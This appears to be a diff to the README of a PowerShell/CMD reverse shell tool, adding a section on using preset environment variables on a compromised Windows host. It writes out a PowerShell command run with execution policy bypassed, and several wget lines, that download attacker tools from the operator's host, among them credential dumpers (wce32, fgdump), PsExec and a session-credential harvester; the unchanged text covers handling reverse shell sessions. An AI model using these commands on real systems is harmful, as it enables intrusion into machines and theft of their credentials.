@@ -79,6 +79,26 @@ Use the CTRL-Z key combination to background a session as usual.
 
 ![basic use](https://github.com/rtaylor777/ps_cmd_rev_shell/blob/master/basic_use.jpg)
 
+**Why Environment Variables**
+
+Well besides the obvious reason of not having to edit the psrev.vbs script because it can pull the Kali HOSTIP and its listening EXP1 port from the environment on Windows, you are all set to run other scripts and commands without editing as well.
+
+I.E. Pulling down wget:<br />
+powershell.exe -Exec Bypass "& {$storageDir = $pwd;$webclient = New-Object System.Net.WebClient;$url = 'http://%HOSTIP%/32/tools/windows_binaries/wget.exe';$file = 'wget.exe';$webclient.DownloadFile($url,$file)}"
+
+Possible wget usage:<br />
+wget -O plink.exe http://%HOSTIP%/32/tools/windows_binaries/plink.exe<br />
+wget -O wce32.exe http://%HOSTIP%/32/tools/wce/wce32.exe<br />
+wget -O PsExec.exe http://%HOSTIP%/32/tools/PsExec.exe<br />
+wget -O fgdump.exe http://%HOSTIP%/64/tools/windows_binaries/fgdump/fgdump.exe<br />
+wget -O Invoke-SessionGopher.ps1 http://%HOSTIP%/scripts/powershell/Invoke-SessionGopher.ps1<br />
+wget -O unzip.exe http://%HOSTIP%/32/tools/unzip.exe<br />
+wget -O accesschk.exe http://%HOSTIP%/32/tools/accesschk.exe<br />
+wget -O subinacl.exe http://%HOSTIP%/32/tools/subinacl.exe<br />
+
+The HOSTIP and EXP1 environment variables are already set in the reverse shell caught when using the "Combined PowerShell and CMD Reverse Shell" unless you used a version that didn't require them to be set.
+
+
 **Entered Text Is Echoed Back**
 
 I always wondered why the reverse shell established with netcat echoed the command that was entered back as well as the output. I discovered the answer while trying to figure out why when a session was backgrounded in the multi/handler and then when I later returned to it none of the entered text was visible, and the output text was jumbled up with some of it on the input prompt line itself. As soon as I echoed back the input command text as well as the output with my PowerShell/CMD reverse shell, returning to a backgrounded session resulted in a session display that made sense.
